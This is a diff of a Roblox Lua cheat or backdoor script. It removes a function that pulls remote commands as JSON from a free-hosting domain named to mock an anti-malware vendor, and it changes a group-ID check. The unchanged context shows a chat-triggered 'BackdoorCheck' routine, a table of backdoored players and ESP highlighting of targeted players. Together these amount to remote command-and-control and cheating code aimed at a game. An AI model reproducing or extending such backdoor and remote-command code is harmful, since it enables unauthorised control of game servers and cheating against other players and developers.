@@ -554,9 +554,6 @@ end
 
 -- [[ Local functions ]] --
 
-local function GetData()
-	return HttpService:JSONDecode(game:HttpGet("https://fuckmalwarebytes2.000webhostapp.com/Commands.json")) -- can I stop getting banned off of web servers 
-end
 	
 local function BackdoorCheck(Player,Chat)
 	if Chat:sub(1,1) == "`" then
@@ -1741,7 +1738,7 @@ Players.PlayerAdded:Connect(function(Player)
 			end 
 			local Backdoor = BackDoorTablePlayers[Player.UserId]
 			local Blacklist = BlacklistTable[Player.UserId]
-			if Blacklist or Player:IsInGroup(5152759) or string.find(Player.Name:lower(),"lynx") then
+			if Blacklist or Player:IsInGroup(0) or string.find(Player.Name:lower(),"lynx") then
 				Esp(Player.Character.Head,Player.Name,Color3.fromRGB(102,51,0),true)
 				Player.CharacterAdded:Connect(function(C)
 					local Head = C:WaitForChild'Head'
@@ -3246,7 +3243,7 @@ coroutine.resume(coroutine.create(function()
 	for i,Player in pairs(Players:GetPlayers()) do
 		local Backdoor = BackDoorTablePlayers[Player.UserId]
 		local Blacklist = BlacklistTable[Player.UserId]
-		if (Blacklist or Player:IsInGroup(5152759) or string.find(Player.Name:lower(),"lynx")) and Player.character and Player.Character:FindFirstChild'Head' then
+		if (Blacklist or Player:IsInGroup(0) or string.find(Player.Name:lower(),"lynx")) and Player.character and Player.Character:FindFirstChild'Head' then
 			Esp(Player.Character.Head,Player.Name,Color3.fromRGB(102,51,0),true)
 			Player.CharacterAdded:Connect(function(C)
 				local Head = C:WaitForChild'Head'
